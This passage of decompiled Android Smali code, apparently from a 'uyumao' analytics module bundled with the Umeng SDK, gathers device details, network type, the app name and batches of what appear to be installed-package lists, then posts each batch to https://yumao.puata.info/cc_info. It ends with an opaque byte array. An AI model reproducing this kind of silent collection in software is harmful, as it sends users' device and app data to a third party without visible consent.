    invoke-virtual {v3}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    .line 663
    .line 664
    .line 665
    move-result-object v3

    .line 666
    iget v3, v3, Landroid/content/pm/ApplicationInfo;->targetSdkVersion:I

    .line 667
    .line 668
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
    :try_end_17
    .catchall {:try_start_17 .. :try_end_17} :catchall_3

    .line 669
    .line 670
    .line 671
    const-string v2, "grant"

    .line 672
    .line 673
    :try_start_18
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 674
    .line 675
    invoke-static {v3}, Lcom/uyumao/n;->a(Landroid/content/Context;)Z

    .line 676
    .line 677
    .line 678
    move-result v3

    .line 679
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
    :try_end_18
    .catchall {:try_start_18 .. :try_end_18} :catchall_3

    .line 680
    .line 681
    .line 682
    :catchall_3
    :try_start_19
    const-string v2, "os"

    .line 683
    .line 684
    const-string v3, "Android"

    .line 685
    .line 686
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 687
    .line 688
    .line 689
    iget-object v2, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 690
    .line 691
    invoke-static {v2}, Lcom/umeng/commonsdk/statistics/common/DeviceConfig;->getNetworkAccessMode(Landroid/content/Context;)[Ljava/lang/String;

    .line 692
    .line 693
    .line 694
    move-result-object v2
    :try_end_19
    .catchall {:try_start_19 .. :try_end_19} :catchall_4

    .line 695
    const-string v3, "Wi-Fi"

    .line 696
    .line 697
    const/4 v4, 0x0

    .line 698
    :try_start_1a
    aget-object v5, v2, v4

    .line 699
    .line 700
    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 701
    .line 702
    .line 703
    move-result v3
    :try_end_1a
    .catchall {:try_start_1a .. :try_end_1a} :catchall_4

    .line 704
    const-string v4, "access"

    .line 705
    .line 706
    if-eqz v3, :cond_c

    .line 707
    .line 708
    :try_start_1b
    const-string v3, "wifi"

    .line 709
    .line 710
    invoke-virtual {v1, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1b
    .catchall {:try_start_1b .. :try_end_1b} :catchall_4

    .line 711
    .line 712
    .line 713
    const/16 v21, 0x0

    .line 714
    .line 715
    goto :goto_3

    .line 716
    :cond_c
    const/16 v21, 0x0

    .line 717
    .line 718
    :try_start_1c
    aget-object v3, v2, v21

    .line 719
    .line 720
    move-object/from16 v5, v20

    .line 721
    .line 722
    invoke-virtual {v5, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 723
    .line 724
    .line 725
    move-result v3

    .line 726
    if-eqz v3, :cond_d

    .line 727
    .line 728
    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 729
    .line 730
    .line 731
    goto :goto_3

    .line 732
    :cond_d
    const-string v3, "unknown"

    .line 733
    .line 734
    invoke-virtual {v1, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1c
    .catchall {:try_start_1c .. :try_end_1c} :catchall_5

    .line 735
    .line 736
    .line 737
    :goto_3
    const-string v3, ""

    .line 738
    .line 739
    const/4 v4, 0x1

    .line 740
    :try_start_1d
    aget-object v5, v2, v4

    .line 741
    .line 742
    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 743
    .line 744
    .line 745
    move-result v3
    :try_end_1d
    .catchall {:try_start_1d .. :try_end_1d} :catchall_5

    .line 746
    if-nez v3, :cond_e

    .line 747
    .line 748
    const-string v3, "sub_access"

    .line 749
    .line 750
    :try_start_1e
    aget-object v2, v2, v4

    .line 751
    .line 752
    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1e
    .catchall {:try_start_1e .. :try_end_1e} :catchall_5

    .line 753
    .line 754
    .line 755
    :cond_e
    const-string v2, "display_name"

    .line 756
    .line 757
    :try_start_1f
    iget-object v3, v8, Lcom/uyumao/r$a;->a:Landroid/content/Context;

    .line 758
    .line 759
    invoke-static {v3}, Lcom/umeng/commonsdk/statistics/common/DeviceConfig;->getAppName(Landroid/content/Context;)Ljava/lang/String;

    .line 760
    .line 761
    .line 762
    move-result-object v3

    .line 763
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1f
    .catchall {:try_start_1f .. :try_end_1f} :catchall_5

    .line 764
    .line 765
    .line 766
    goto :goto_4

    .line 767
    :catchall_4
    const/16 v21, 0x0

    .line 768
    .line 769
    :catchall_5
    :goto_4
    :try_start_20
    iget-object v2, v8, Lcom/uyumao/r$a;->e:Lcom/uyumao/r;

    .line 770
    .line 771
    invoke-static {v2}, Lcom/uyumao/r;->a(Lcom/uyumao/r;)Lorg/json/JSONObject;

    .line 772
    .line 773
    .line 774
    move-result-object v2

    .line 775
    move-object/from16 v3, v19

    .line 776
    .line 777
    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 778
    .line 779
    .line 780
    move-result-object v2

    .line 781
    const-string v4, ","

    .line 782
    .line 783
    invoke-virtual {v2, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    .line 784
    .line 785
    .line 786
    move-result-object v2

    .line 787
    new-instance v4, Lorg/json/JSONArray;

    .line 788
    .line 789
    invoke-direct {v4}, Lorg/json/JSONArray;-><init>()V

    .line 790
    .line 791
    .line 792
    const/4 v5, 0x0

    .line 793
    :goto_5
    array-length v6, v2

    .line 794
    if-ge v5, v6, :cond_f

    .line 795
    .line 796
    aget-object v6, v2, v5

    .line 797
    .line 798
    invoke-virtual {v4, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 799
    .line 800
    .line 801
    add-int/lit8 v5, v5, 0x1

    .line 802
    .line 803
    goto :goto_5

    .line 804
    :cond_f
    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 805
    .line 806
    .line 807
    iget-object v2, v8, Lcom/uyumao/r$a;->e:Lcom/uyumao/r;

    .line 808
    .line 809
    invoke-static {v2}, Lcom/uyumao/r;->a(Lcom/uyumao/r;)Lorg/json/JSONObject;

    .line 810
    .line 811
    .line 812
    move-result-object v2

    .line 813
    move-object/from16 v3, v18

    .line 814
    .line 815
    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 816
    .line 817
    .line 818
    move-result-object v2

    .line 819
    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 820
    .line 821
    .line 822
    iget-object v2, v8, Lcom/uyumao/r$a;->e:Lcom/uyumao/r;

    .line 823
    .line 824
    invoke-static {v2}, Lcom/uyumao/r;->a(Lcom/uyumao/r;)Lorg/json/JSONObject;

    .line 825
    .line 826
    .line 827
    move-result-object v2

    .line 828
    move-object/from16 v3, v17

    .line 829
    .line 830
    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 831
    .line 832
    .line 833
    move-result-object v2

    .line 834
    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 835
    .line 836
    .line 837
    iget-object v2, v8, Lcom/uyumao/r$a;->e:Lcom/uyumao/r;

    .line 838
    .line 839
    invoke-static {v2}, Lcom/uyumao/r;->a(Lcom/uyumao/r;)Lorg/json/JSONObject;

    .line 840
    .line 841
    .line 842
    move-result-object v2

    .line 843
    const-string v3, "actionName"

    .line 844
    .line 845
    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 846
    .line 847
    .line 848
    move-result-object v2

    .line 849
    new-instance v3, Lorg/json/JSONArray;

    .line 850
    .line 851
    iget-object v4, v8, Lcom/uyumao/r$a;->e:Lcom/uyumao/r;

    .line 852
    .line 853
    invoke-static {v4}, Lcom/uyumao/r;->a(Lcom/uyumao/r;)Lorg/json/JSONObject;

    .line 854
    .line 855
    .line 856
    move-result-object v4

    .line 857
    move-object/from16 v5, v16

    .line 858
    .line 859
    invoke-virtual {v4, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    .line 860
    .line 861
    .line 862
    move-result-object v4

    .line 863
    invoke-direct {v3, v4}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    .line 864
    .line 865
    .line 866
    new-instance v4, Lorg/json/JSONObject;

    .line 867
    .line 868
    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 869
    .line 870
    .line 871
    invoke-virtual {v4, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 872
    .line 873
    .line 874
    invoke-virtual {v1, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_20
    .catchall {:try_start_20 .. :try_end_20} :catchall_6

    .line 875
    .line 876
    .line 877
    :catchall_6
    :try_start_21
    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    .line 878
    .line 879
    .line 880
    move-result v2

    .line 881
    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    .line 882
    .line 883
    .line 884
    move-result-object v0

    .line 885
    const/4 v4, 0x0

    .line 886
    :goto_6
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 887
    .line 888
    .line 889
    move-result v3

    .line 890
    if-eqz v3, :cond_10

    .line 891
    .line 892
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 893
    .line 894
    .line 895
    move-result-object v3

    .line 896
    check-cast v3, Lorg/json/JSONArray;

    .line 897
    .line 898
    const/4 v5, 0x1

    .line 899
    add-int/2addr v4, v5

    .line 900
    const-string v6, "batch"

    .line 901
    .line 902
    invoke-virtual {v1, v6, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 903
    .line 904
    .line 905
    const-string v6, "batch_num"

    .line 906
    .line 907
    invoke-virtual {v1, v6, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
    :try_end_21
    .catchall {:try_start_21 .. :try_end_21} :catchall_7

    .line 908
    .line 909
    .line 910
    const-string v6, "batch_pkg_num"

    .line 911
    .line 912
    :try_start_22
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    .line 913
    .line 914
    .line 915
    move-result v7

    .line 916
    invoke-virtual {v1, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 917
    .line 918
    .line 919
    const-string v6, "apl"

    .line 920
    .line 921
    invoke-virtual {v1, v6, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_22
    .catchall {:try_start_22 .. :try_end_22} :catchall_7

    .line 922
    .line 923
    .line 924
    const-string v3, "https://yumao.puata.info/cc_info"

    .line 925
    .line 926
    :try_start_23
    iget-object v6, v8, Lcom/uyumao/r$a;->d:Ljava/lang/String;

    .line 927
    .line 928
    invoke-static {v1, v3, v6}, Lcom/uyumao/e;->a(Lorg/json/JSONObject;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_0
    .catchall {:try_start_23 .. :try_end_23} :catchall_7

    .line 929
    .line 930
    .line 931
    goto :goto_6

    .line 932
    :catch_0
    move-exception v0

    .line 933
    :try_start_24
    throw v0
    :try_end_24
    .catchall {:try_start_24 .. :try_end_24} :catchall_7

    .line 934
    :cond_10
    invoke-static {v9}, Lcom/uyumao/n;->a(Ljava/io/Closeable;)V

    .line 935
    .line 936
    .line 937
    goto :goto_9

    .line 938
    :catchall_7
    move-exception v0

    .line 939
    goto :goto_7

    .line 940
    :catchall_8
    move-exception v0

    .line 941
    move-object/from16 v8, p0

    .line 942
    .line 943
    goto :goto_7

    .line 944
    :catchall_9
    move-exception v0

    .line 945
    move-object v8, v1

    .line 946
    :goto_7
    move-object v7, v9

    .line 947
    goto :goto_8

    .line 948
    :catchall_a
    move-exception v0

    .line 949
    move-object v8, v1

    .line 950
    :goto_8
    :try_start_25
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_25
    .catchall {:try_start_25 .. :try_end_25} :catchall_b

    .line 951
    .line 952
    .line 953
    invoke-static {v7}, Lcom/uyumao/n;->a(Ljava/io/Closeable;)V

    .line 954
    .line 955
    .line 956
    :goto_9
    return-void

    .line 957
    :catchall_b
    move-exception v0

    .line 958
    move-object v1, v0

    .line 959
    invoke-static {v7}, Lcom/uyumao/n;->a(Ljava/io/Closeable;)V

    .line 960
    .line 961
    .line 962
    goto :goto_b

    .line 963
    :goto_a
    throw v1

    .line 964
    :goto_b
    goto :goto_a

    .line 965
    :array_0
    .array-data 1
        0x12t
        -0x77t
        0x1ft
        0x16t
        0x8t
        0x2dt
        0x8t
        0x1at
        0x5t
        0xat
        0x62t
        0x4et
        -0x33t
        0x2ft
        -0x7dt
        0x22t
        0x11t
        0x6ct
        -0x70t
        -0x68t
        0x5ft
        0x22t
        0x78t
        0x3dt
        -0x34t
        -0x4dt
        0x8t
        0x6bt
        -0x4t
        0x38t
        0x52t
        -0x31t
        -0x77t
        -0x12t
        -0x6ft
        -0x14t
        0x6et
        -0x6ct
        -0x20t
        -0x1ct
        0x58t
        -0x5t
        0x45t
        -0x1at
        0x78t
        -0x24t
        0x5t
        -0x4dt
        -0x2et
        0x1dt
        0x18t
        -0x73t
        -0x76t
        -0x9t
        -0x6ct
        -0x56t
        -0x11t
        0x22t
        0x73t
        -0x7bt
        0x5dt
        0x35t
        0x76t
        0x40t
        0x30t
        -0x65t
        -0x53t
        -0x3bt
        -0x63t
        0x24t
        0x45t
        -0x68t
        0x33t
        -0x7et
        0x8t
        -0x12t
        0x4ft
        -0x73t
        -0x10t
        0x54t
        -0x31t
        0x48t
        0x42t
        0x31t
        0x5dt
        -0x16t
        -0x7ft
        -0x2ft
        -0x3bt
        -0x56t
        0xet
        -0xct
        -0x64t
        -0xct
        0x35t
        0x55t
        0x25t
        -0x4bt
        -0x1et
        0x1ft
        0x2ct
        -0x53t
        0x63t
        -0x6ct
        -0x5ct
        -0x7ft
        -0x20t
        0x57t
        -0x3dt
        -0x53t
        -0x5at
        0x7bt
        -0x62t
        -0x20t
        -0x3ct
        0x4dt
        0x71t
        -0x3ct
        0x65t
        0x51t
        0x39t
        -0x48t
        -0x56t
        0x1ct
        -0x4at
        0x58t
        0x23t
        -0x76t
        -0x16t
        -0x4at
        -0x1dt
        -0x67t
        -0x56t
        -0x19t
        0x13t
        -0x4et
        0x3et
        0x1ct
        -0x64t
        -0x44t
        0x1t
        0x23t
        -0x44t
        0x3at
        -0x64t
        0x1dt
        0x5t
        -0xat
        -0x5ft
        0x14t
        0x62t
        0x7ct
        -0x28t
        0x63t
        -0x64t
        0x8t
        -0x7et
        -0xat
        0x4ft
        -0x1ft
        -0x2at
        -0x72t
        0xct
        0x1bt
        -0x66t
        0x72t
        -0x6bt
        -0x23t
        0x52t
        0x15t
        0x61t
        -0x9t
        0x27t
        -0x14t
        0x7bt
        -0x25t
        -0x44t
        -0x4et
        -0x59t
        0xdt
        0x3t
        0x15t
        0x15t
        0xct
        0x28t
        0xet
        0x1dt
    .end array-data
.end method
